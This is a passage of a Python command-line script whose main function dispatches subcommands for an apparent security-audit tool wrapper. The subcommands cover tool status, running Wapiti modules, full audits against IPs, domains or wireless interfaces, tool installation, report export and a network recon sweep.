    audit_p.add_argument("--interface", help="Target wireless interface (e.g. wlp0s20f3, wlan0)")

    # Install a tool
    inst_p = sub.add_parser("install", help="Install a tool")
    inst_p.add_argument("tool")

    # Export report
    exp_p = sub.add_parser("export", help="Save report content to file")
    exp_p.add_argument("--out", required=True, help="Destination file path")
    exp_p.add_argument("--content", default="", help="Report content string")
    exp_p.add_argument("--file", help="Input file containing content")

    # Network Recon command
    recon_p = sub.add_parser("recon", help="Perform Network Recon (local IP & subnet sweep)")
    recon_p.add_argument("target", nargs="?", default="", help="Optional specific subnet or IP")

    args = parser.parse_args()

    if args.cmd == "status":
        status = get_tool_status()
        emit("status", tools=status)

    elif args.cmd == "wapiti-modules":
        emit("wapiti_modules", total=len(WAPITI_MODULES), modules=WAPITI_MODULES)

    elif args.cmd == "run":
        run_tool(args.tool, args.target, opts={"modules": getattr(args, "modules", "all")})

    elif args.cmd == "audit":
        targets_dict = {}
        if args.targets:
            try:
                targets_dict = json.loads(args.targets)
            except Exception:
                targets_dict = {}
        if args.ip: targets_dict["ip"] = args.ip
        if args.domain: targets_dict["domain"] = args.domain
        if args.url: targets_dict["url"] = args.url
        if args.cloud: targets_dict["cloud"] = args.cloud
        if args.path: targets_dict["path"] = args.path
        if args.user: targets_dict["username"] = args.user
        if args.interface: targets_dict["interface"] = args.interface

        primary_target = (
            args.target
            or targets_dict.get("ip")
            or targets_dict.get("domain")
            or targets_dict.get("url")
            or targets_dict.get("cloud")
            or targets_dict.get("path")
            or targets_dict.get("username")
            or targets_dict.get("interface")
            or "target"
        )
        run_full_audit(primary_target, args.tools, targets_dict)

    elif args.cmd == "install":
        install_tool(args.tool)

    elif args.cmd == "export":
        out_path = os.path.expanduser(args.out.strip())
        content = args.content or ""
        if args.file and os.path.exists(args.file):
            try:
                with open(args.file, "r", encoding="utf-8") as f:
                    content = f.read()
            except Exception as e:
                emit("export_done", path=out_path, success=False, error=str(e))
                return
        try:
            parent_dir = os.path.dirname(os.path.abspath(out_path))
            if parent_dir:
                os.makedirs(parent_dir, exist_ok=True)
            with open(out_path, "w", encoding="utf-8") as f:
                f.write(content)
            emit("export_done", path=out_path, success=True, bytes=len(content))
        except Exception as e:
            emit("export_done", path=out_path, success=False, error=str(e))

    elif args.cmd == "recon":
        run_network_recon(args.target)

    else:
        parser.print_help()

if __name__ == "__main__":
    main()
